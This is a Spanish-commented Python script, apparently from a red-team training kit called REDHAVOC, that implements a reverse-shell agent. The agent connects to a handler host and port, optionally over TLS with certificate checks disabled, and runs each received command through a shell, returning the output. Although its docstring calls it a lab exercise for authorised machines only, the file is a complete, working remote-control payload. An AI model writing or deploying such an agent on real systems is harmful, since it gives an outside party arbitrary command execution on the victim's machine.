#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
agent_shell.py — Agente de LABORATORIO para post/multi_handler (REDHAVOC)
==========================================================================
Shell reversa de práctica para entornos AUTORIZADOS. Conéctalo al handler:

    python3 agent_shell.py <LHOST_del_handler> <LPORT>
    python3 agent_shell.py <LHOST_del_handler> <LPORT> --tls   (handler con TLS=true)

Comportamiento:
    • Conecta TCP (o TLS con --tls) y entra en bucle: recibe un comando, lo
      ejecuta con subprocess en el host del laboratorio y devuelve stdout+stderr.
    • Con --tls el certificado del handler del lab NO se verifica (autofirmado):
      cifra el canal, es una medida de higiene, no de anonimato.
    • `background` en el handler simplemente desconecta este agente.
    • Sin persistencia, sin evasión: es un agente didáctico.

AVISO: ejecuta este agente SOLO en máquinas que te pertenezcan o con
autorización escrita. Es la pieza "víctima" del ejercicio de laboratorio.
"""

import socket
import ssl
import subprocess
import sys


def bucle_agente(host: str, puerto: int, usar_tls: bool = False) -> None:
    """Conecta al handler (TCP o TLS) y ejecuta comandos recibidos."""
    try:
        conn = socket.create_connection((host, puerto), timeout=10)
    except OSError as err:
        print(f"[agent] No se pudo conectar a {host}:{puerto} — {err}")
        return

    if usar_tls:
        # Laboratorio: el handler usa certificado autofirmado → no verificamos.
        contexto = ssl._create_unverified_context()
        try:
            conn = contexto.wrap_socket(conn, server_hostname=host)
        except ssl.SSLError as err:
            print(f"[agent] Handshake TLS fallido — {err}")
            conn.close()
            return
        print("[agent] Túnel TLS activo (cert del lab sin verificar).")

    conn.sendall(f"[agent] Conectado desde {socket.gethostname()}\n".encode())

    while True:
        try:
            datos = conn.recv(4096)
        except (ConnectionResetError, OSError):
            break
        if not datos:
            break
        comando = datos.decode(errors="replace").strip()
        if not comando:
            continue
        if comando.lower() in ("exit", "quit"):
            break
        try:
            resultado = subprocess.run(comando, shell=True, capture_output=True, timeout=30)
            salida = resultado.stdout + resultado.stderr
            conn.sendall(salida or b"(sin salida)\n")
        except subprocess.TimeoutExpired:
            conn.sendall(b"[agent] Comando agotado (30s)\n")
        except Exception as err:  # noqa: BLE001
            conn.sendall(f"[agent] Error: {err}\n".encode())

    conn.close()


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if a != "--tls"]
    usar_tls = "--tls" in sys.argv
    if len(args) < 2:
        print(f"Uso: python3 {sys.argv[0]} <LHOST> <LPORT> [--tls]")
        print("Ejemplo: python3 agent_shell.py 127.0.0.1 4444 --tls")
        sys.exit(1)
    bucle_agente(args[0], int(args[1]), usar_tls)
